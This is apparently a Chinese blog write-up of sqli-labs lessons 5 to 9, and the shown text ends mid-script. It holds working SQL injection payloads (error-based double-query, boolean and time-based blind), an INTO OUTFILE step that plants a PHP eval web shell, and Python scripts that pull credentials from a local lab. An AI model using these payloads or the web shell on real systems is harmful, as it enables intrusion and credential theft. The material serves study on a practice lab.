<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+--------------------------+</span><br><span class="line">| id                       |</span><br><span class="line">| username                 |</span><br><span class="line">| password                 |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure>

<p>然后判断第一个username。</p>
<p><code>?id=1&#39; and (select ascii(substr(username,1,1)) from users limit 0,1)=68--+</code> 判断出第一位字母为D，以此类推。最后找出表的password和username</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br></pre></td></tr></table></figure>

<p>这题还存在着另外一个解法，也是题目本来想要的解法。使用双注。</p>
<p>rand():返回随机值</p>
<p>floor():向下舍入为指定的位数</p>
<p>ceiling():向上取证为指定给的位数</p>
<p>Group by:分组</p>
<p>使用二次查询的方式，就是一个select里面再嵌套一个select，如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat((select database()));</span><br><span class="line">+-----------------------------+</span><br><span class="line">| concat((select database())) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| security                    |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure>

<p>双注的意思是当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</p>
<p>利用rand可以返回随机数，加入floor可以返回0或者1。rand(0)会返回固定值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand();</span><br><span class="line">+---------------------+</span><br><span class="line">| rand()              |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.49487676145031745 |</span><br><span class="line">+---------------------+</span><br><span class="line">mysql&gt; select rand(0);</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">+---------------------+</span><br><span class="line">mysql&gt; select floor(rand(0));</span><br><span class="line">+----------------+</span><br><span class="line">| floor(rand(0)) |</span><br><span class="line">+----------------+</span><br><span class="line">|              0 |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;,floor(rand()*2)) from users;</span><br><span class="line">ERROR:</span><br><span class="line">No query specified</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;,floor(rand()*2)) |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| ~security~0                                         |</span><br><span class="line">| ~security~0                                         |</span><br><span class="line">| ~security~1                                         |</span><br><span class="line">| ~security~1                                         |</span><br><span class="line">| ~security~1                                         |</span><br><span class="line">| ~security~0                                         |</span><br><span class="line">| ~security~1                                         |</span><br><span class="line">| ~security~0                                         |</span><br><span class="line">| ~security~1                                         |</span><br><span class="line">| ~security~0                                         |</span><br><span class="line">| ~security~1                                         |</span><br><span class="line">| ~security~1                                         |</span><br><span class="line">| ~security~0                                         |</span><br><span class="line">+-----------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>这样构造可以发现有多少条记录，就返回多少条</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;,floor(rand()*2))as a from information_schema.tables group by a;</span><br><span class="line">+-------------+</span><br><span class="line">| a           |</span><br><span class="line">+-------------+</span><br><span class="line">| ~security~0 |</span><br><span class="line">| ~security~1 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure>

<p>再利用gourp by进行分组得到两组。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a;</span><br><span class="line">+----------+-----------+</span><br><span class="line">| count(*) | a         |</span><br><span class="line">+----------+-----------+</span><br><span class="line">|      134 | security0 |</span><br><span class="line">|      158 | security1 |</span><br><span class="line">+----------+-----------+</span><br></pre></td></tr></table></figure>

<p>然后注意information_schema.schemata：包含了所有数据库名，就差不多可以开始尝试了。</p>
<p>我自己从hackbar生成一条，返回了<code>Duplicate entry &#39;security~1&#39; for key &#39;&#39;</code></p>
<p>这里用的是派生表报错select 1 from (table name); 这样的语法来报错。</p>
<pre><code>?id=1&#39; AND(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=DATABASE() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--+
</code></pre>
<p>然后自己写的是</p>
<pre><code>?id=-1&#39; union all select count(*),0x7e,concat( &#39;~&#39;,(select database() from information_schema.schemata limit 4,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a --+
</code></pre>
<p>返回<code>Duplicate entry &#39;~security~1&#39; for key &#39;&#39;</code></p>
<p>得到了数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union all select count(*),0x7e,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.schemata group by a--+</span><br></pre></td></tr></table></figure>

<p>返回<code>Duplicate entry &#39;~users~0&#39; for key &#39;&#39;</code></p>
<p>得到了users表</p>
<pre><code>?id=-1&#39; union all select count(*),0x7e,concat( &#39;~&#39;,(select column_name from information_schema.columns where table_name= &#39;users&#39; limit x,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a --+
</code></pre>
<p>x换成数字得到具体字段</p>
<pre><code>?id=-1&#39; union all select count(*),1,concat( &#39;~&#39;,(select concat(id,username,password) from users limit 2,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a--+ 
</code></pre>
<p>得到具体的数据。</p>
<h2 id="Less-6-GET-双注入-双引号字符型注入"><a href="#Less-6-GET-双注入-双引号字符型注入" class="headerlink" title="Less-6 GET-双注入-双引号字符型注入"></a>Less-6 GET-双注入-双引号字符型注入</h2><p>这道题和5类似，就源码中多了<code>&quot;&quot;</code>,只需要修改部分的闭合就可以了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = &#x27;&quot;&#x27;.$id.&#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">//第六题</span><br></pre></td></tr></table></figure>

<p>只需要把原来的<code>&#39;&#39;</code>改成<code>&quot;&quot;</code>就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot; union all select count(*),0x7e,concat( &#x27;~&#x27;,(select database() from information_schema.schemata limit 4,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.schemata group by a --+</span><br></pre></td></tr></table></figure>

<p>返回<code>Duplicate entry &#39;~security~0&#39; for key &#39;&#39;</code></p>
<p>得到数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot; union all select count(*),0x7e,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.schemata group by a--+</span><br></pre></td></tr></table></figure>

<p>返回<code>Duplicate entry &#39;~users~1&#39; for key &#39;&#39;</code></p>
<p>得到users表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot; union all select count(*),0x7e,concat( &#x27;~&#x27;,(select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit x,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.schemata group by a --+</span><br></pre></td></tr></table></figure>

<p>x换成数字得到具体字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot; union all select count(*),1,concat( &#x27;~&#x27;,(select concat(id,&#x27;~&#x27;,username,&#x27;~&#x27;,password) from users limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.schemata group by a--+ </span><br></pre></td></tr></table></figure>

<p>返回<code>Duplicate entry &#39;~3~Dummy~p@ssword~0&#39; for key &#39;&#39;</code></p>
<p>得到一个用户的账号密码。剩下的爆破一下就好了。</p>
<h2 id="Less-7-GET-导出文件字符型注入"><a href="#Less-7-GET-导出文件字符型注入" class="headerlink" title="Less-7 GET-导出文件字符型注入"></a>Less-7 GET-导出文件字符型注入</h2><p>这一题和前面是不一样的了，涉及到写入文件了。</p>
<p>查看一下源码，发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">....</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>备注中已经有了提示，同时id也没有过滤，因此我们可以用<code>))</code>绕过</p>
<p>测试一下没反应，同时提示用<code>outfile</code></p>
<p><code>outfile：select &#39;需要写入的内容&#39; out file &#39;文件的绝对路径&#39;</code></p>
<p><code>一句话木马: &lt;?php @eval($_REQUEST[“password”]) ?&gt;</code></p>
<p>我们先验证一下文件的权限可读性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and (select count(*) from mysql.user)&gt;0--+</span><br></pre></td></tr></table></figure>

<p>发现正常返回</p>
<blockquote>
<p>这里要说一下，我搞这搞了好久，因为马写完了，但是文件一直没出来，因为我一直少了个东西，应该去mysql的默认文件夹下，找到my.ini文件，然后在文件中加入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv=</span><br></pre></td></tr></table></figure>

<p>这句话，然后保存，重启mysql，才能进行操作的。这是赋予了权限。</p>
</blockquote>
<p>先本地试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from security.users into outfile &quot;D:\\phpstudy_pro\\WWW\\1.php&quot;;</span><br><span class="line">Query OK, 13 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>返回了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1	Dumb	Dumb</span><br><span class="line">2	Angelina	I-kill-you</span><br><span class="line">3	Dummy	p@ssword</span><br><span class="line">4	secure	crappy</span><br><span class="line">5	stupid	stupidity</span><br><span class="line">6	superman	genious</span><br><span class="line">7	batman	mob!le</span><br><span class="line">8	admin	admin</span><br><span class="line">9	admin1	admin1</span><br><span class="line">10	admin2	admin2</span><br><span class="line">11	admin3	admin3</span><br><span class="line">12	dhakkan	dumbo</span><br><span class="line">14	admin4	admin4</span><br></pre></td></tr></table></figure>

<p>所以大概了解语句怎么用了。</p>
<p>然后用order by判断字段的个数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) order by 4--+</span><br></pre></td></tr></table></figure>

<p>然后进行注入</p>
<p><code>?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_post [“password”]);?&gt;&#39; into outfile&#39;D:\\phpstudy_pro\\WWW\\1.php&#39; --+</code></p>
<p>终于成功了，返回了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1	Dumb	Dumb</span><br><span class="line">1	2	&lt;?php @eval($_post [“password”]);?&gt;</span><br></pre></td></tr></table></figure>

<p>然后上菜刀，连接。</p>
<h2 id="Less-8-GET-单引号字符型布尔盲注"><a href="#Less-8-GET-单引号字符型布尔盲注" class="headerlink" title="Less-8 GET-单引号字符型布尔盲注"></a>Less-8 GET-单引号字符型布尔盲注</h2><p>都说了是布尔，然后第五题的时候其实就已经写过了。</p>
<p>然后这题是我第一次试着用脚本写一个sql盲注，写了一晚上，只能说自己太菜了，但是大概理解了一点，脚本写的很烂，代码也很杂乱，可能除了自己也没有人可以看得懂了。太晚了也懒得打备注了。怎么说呢，反正第一次写的，总有意义嘛，还是得记录下来的。虽然借鉴了很多博客，但终究成了自己的东西。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/sqli-labs-master/Less-8/?id=&quot;</span><br><span class="line"></span><br><span class="line">database_name = &#x27;&#x27;</span><br><span class="line">for database_length in range(1, 10):</span><br><span class="line">    payload = &quot;1&#x27; and length(database())=&quot; + str(database_length) + &quot;--+&quot;</span><br><span class="line">    response = requests.get(url + payload)</span><br><span class="line">    if &quot;You are in...........&quot; in response.text:  # 得出数据库长度</span><br><span class="line">        for i in range(database_length + 1):  # 按位遍历，+1是为了之后引用在payload里面可以避免丢失一位。</span><br><span class="line">            for j in range(32, 127):  # 遍历表的ascii码</span><br><span class="line">                payload = &quot;1&#x27; and ascii(substr(database(),%d,1))=%d--+&quot; % (i, j)</span><br><span class="line">                response = requests.get(url + payload)</span><br><span class="line">                if &quot;You are in...........&quot; in response.text:</span><br><span class="line">                    database_name += chr(j)</span><br><span class="line">                    print(database_name)</span><br><span class="line">print(&quot;数据库是&quot; + database_name)</span><br><span class="line"></span><br><span class="line">for tables in range(1, 10):</span><br><span class="line">    payload = &quot;1&#x27; and (select count(*) from information_schema.tables where table_schema=database())=%d--+&quot; % tables</span><br><span class="line">    response = requests.get(url + payload)</span><br><span class="line">    if &quot;You are in...........&quot; in response.text:</span><br><span class="line">        print(tables)</span><br><span class="line">        for i in range(tables):  # 划分不同的表进行遍历</span><br><span class="line">            table_name = &#x27;&#x27;</span><br><span class="line">            for j in range(1,10):</span><br><span class="line">                payload=&quot;1&#x27; and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+&quot;%(i,j)</span><br><span class="line">                response=requests.get(url+payload)</span><br><span class="line">                if &quot;You are in...........&quot; in response.text:</span><br><span class="line">                    print(&quot;第&quot;+str(i+1)+&quot;个表的长度的为&quot;+str(j)) #先找出每个表长度</span><br><span class="line">                    for a in range(j+1): #找出每个表的每个名字</span><br><span class="line">                        for k in range(32, 127):</span><br><span class="line">                            payload = &quot;1&#x27; and (select ascii(substr(table_name,%d,1)) from information_schema.tables where &quot; \</span><br><span class="line">                              &quot;table_schema=database() limit %d,1)=%d--+&quot; % (a, i, k)</span><br><span class="line">                            response = requests.get(url + payload)</span><br><span class="line">                            if &quot;You are in...........&quot; in response.text:</span><br><span class="line">                                table_name+=chr(k)</span><br><span class="line">                                print(table_name)</span><br><span class="line">                                #到这里我们就可以得到数据库名字和表的名字了，然后就可以根据名字直接找列</span><br><span class="line">for i in range(1,10):# 找到列数</span><br><span class="line">    payload=&quot;1&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=%d--+&quot;%(i)</span><br><span class="line">    response = requests.get(url + payload)</span><br><span class="line">    if &quot;You are in...........&quot; in response.text:</span><br><span class="line">        print(&quot;表的列数的为&quot; + str(i)) #得到有三个表</span><br><span class="line">        for a in range(i+1):</span><br><span class="line">            column_name=&#x27;&#x27;</span><br><span class="line">            for j in range(1,10): #得到每个表表长</span><br><span class="line">                payload=&quot;1&#x27; and (select length(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit %d,1)=%d--+&quot;%(a,j)</span><br><span class="line">                response = requests.get(url + payload)</span><br><span class="line">                if &quot;You are in...........&quot; in response.text:</span><br><span class="line">                    print(&quot;第&quot;+str(a+1)+&quot;个列的长度为&quot;+str(j)) </span><br><span class="line">                    for b in range(j+1):</span><br><span class="line">                        for k in range(32,127): #对每一个表的名字进行爆破</span><br><span class="line">                            payload=&quot;1&#x27; and (select ascii(substr(column_name,%d,1)) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit %d,1)=%d--+&quot;%(b,a,k)</span><br><span class="line">                            response = requests.get(url + payload)</span><br><span class="line">                            if &quot;You are in...........&quot; in response.text:</span><br><span class="line">                                column_name += chr(k)</span><br><span class="line">                                print(column_name)</span><br><span class="line">#现在我们有了三个表id,username,password,可以爆破出信息了</span><br><span class="line">username=&#x27;&#x27;</span><br><span class="line">for i in range(2):</span><br><span class="line">    for j in range(10):</span><br><span class="line">        for k in range(32,127): #得到所有的用户名</span><br><span class="line">            payload=&quot;1&#x27; and (select ascii(substr(username,%d,1)) from users limit %d,1)=%d--+&quot;%(j,i,k)</span><br><span class="line">            response = requests.get(url + payload)</span><br><span class="line">            if &quot;You are in...........&quot; in response.text:</span><br><span class="line">                username+=chr(k)</span><br><span class="line">                print(username)</span><br><span class="line">    username+=&#x27;,&#x27;</span><br><span class="line">password=&#x27;&#x27;</span><br><span class="line">for i in range(20):</span><br><span class="line">    for j in range(10):</span><br><span class="line">        for k in range(32,127):#得到所有的密码</span><br><span class="line">            payload=&quot;1&#x27; and (select ascii(substr(password,%d,1)) from users limit %d,1)=%d--+&quot;%(j,i,k)</span><br><span class="line">            response = requests.get(url + payload)</span><br><span class="line">            if &quot;You are in...........&quot; in response.text:</span><br><span class="line">                password+=chr(k)</span><br><span class="line">                print(password)</span><br><span class="line">    password+=&#x27;,&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="Less-9-GET-单引号字符型时间盲注"><a href="#Less-9-GET-单引号字符型时间盲注" class="headerlink" title="Less-9 GET-单引号字符型时间盲注"></a>Less-9 GET-单引号字符型时间盲注</h2><p>其实和第八题的思路是一样的都是盲注，但是这题我们可以试试时间盲注</p>
<p>时间盲注需要用到一个if函数和sleep函数</p>
<p><code>if(a,b,c)：表示满足a的时候执行b，不满足执行c</code></p>
<p><code>sleep(x) ：执行延迟x秒</code></p>
<p>我们可以通过在sleep的过程中，发现了延迟，得到了盲注成功的结果</p>
<p><code>if(条件，sleep(0.1),1)</code></p>
<p>然后拿第八题的代码改一下就可以了，如果不嫌浪费时间，sleep时间可以加大，然后相减时间也对应加大，这样误差更小</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=&quot;</span><br><span class="line"></span><br><span class="line">database_name = &#x27;&#x27;</span><br><span class="line">for database_length in range(1, 10):</span><br><span class="line">    payload = &quot;1&#x27; and if(length(database())=&quot; + str(database_length) + &quot;,sleep(1.5),1)--+&quot;</span><br><span class="line">    t = time.time()  # 开始前时间</span><br><span class="line">    response = requests.get(url + payload)</span><br><span class="line">    if time.time() - t &gt; 1.4:  # 得出数据库长度</span><br><span class="line">        for i in range(database_length + 1):  # 按位遍历，+1是为了之后引用在payload里面可以避免丢失一位。</span><br><span class="line">            for j in range(32, 127):  # 遍历表的ascii码</span><br><span class="line">                payload = &quot;1&#x27; and if(ascii(substr(database(),%d,1))=%d,sleep(1.5),1)--+&quot; % (i, j)</span><br><span class="line">                t = time.time()</span><br><span class="line">                response = requests.get(url + payload)</span><br><span class="line">                if time.time() - t &gt; 1.4:</span><br><span class="line">                    database_name += chr(j)</span><br><span class="line">                    print(database_name)</span><br><span class="line">print(&quot;数据库是&quot; + database_name)</span><br><span class="line"></span><br><span class="line">for tables in range(1, 10):</span><br><span class="line">    payload = &quot;1&#x27; and if((select count(*) from information_schema.tables where table_schema=database())=%d,sleep(1.5),1)--+&quot; % tables</span><br><span class="line">    t = time.time()</span><br><span class="line">    response = requests.get(url + payload)</span><br><span class="line">    if time.time() - t &gt; 1.4:</span><br><span class="line">        print(tables)</span><br><span class="line">        for i in range(tables):  # 划分不同的表进行遍历</span><br><span class="line">            table_name = &#x27;&#x27;</span><br><span class="line">            for j in range(1, 10):</span><br><span class="line">                payload = &quot;1&#x27; and if((select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d,sleep(1.5),1)--+&quot; % (</span><br><span class="line">                i, j)</span><br><span class="line">                t = time.time()</span><br><span class="line">                response = requests.get(url + payload)</span><br><span class="line">                if time.time() - t &gt; 1.4:</span><br><span class="line">                    print(&quot;第&quot; + str(i + 1) + &quot;个表的长度的为&quot; + str(j))  # 先找出每个表长度</span><br><span class="line">                    for a in range(j + 1):  # 找出每个表的每个名字</span><br><span class="line">                        for k in range(32, 127):</span><br><span class="line">                            payload = &quot;1&#x27; and if((select ascii(substr(table_name,%d,1)) from information_schema.tables where &quot; \</span><br><span class="line">                                      &quot;table_schema=database() limit %d,1)=%d,sleep(1.5),1)--+&quot; % (a, i, k)</span><br><span class="line">                            t = time.time()</span><br><span class="line">                            response = requests.get(url + payload)</span><br><span class="line">                            if time.time() - t &gt; 1.4:</span><br><span class="line">                                table_name += chr(k)</span><br><span class="line">                                print(table_name)</span><br><span class="line">                                # 到这里我们就可以得到数据库名字和表的名字了，然后就可以根据名字直接找列</span><br><span class="line">for i in range(1, 10):  # 找到列数</span><br><span class="line">    payload = &quot;1&#x27; and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=%d,sleep(1.5),1)--+&quot; % (</span><br><span class="line">        i)</span><br><span class="line">    t = time.time()</span><br><span class="line">    response = requests.get(url + payload)</span><br><span class="line">    if time.time() - t &gt; 1.4:</span><br><span class="line">        print(&quot;表的列数的为&quot; + str(i))  # 得到有三个表</span><br><span class="line">        for a in range(i + 1):</span><br><span class="line">            column_name = &#x27;&#x27;</span><br><span class="line">            for j in range(1, 10):  # 得到每个表表长</span><br><span class="line">                payload = &quot;1&#x27; and if((select length(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit %d,1)=%d,sleep(1.5),1)--+&quot; % (</span><br><span class="line">                a, j)</span><br><span class="line">                t = time.time()</span><br><span class="line">                response = requests.get(url + payload)</span><br><span class="line">                if time.time() - t &gt; 1.4:</span><br><span class="line">                    print(&quot;第&quot; + str(a + 1) + 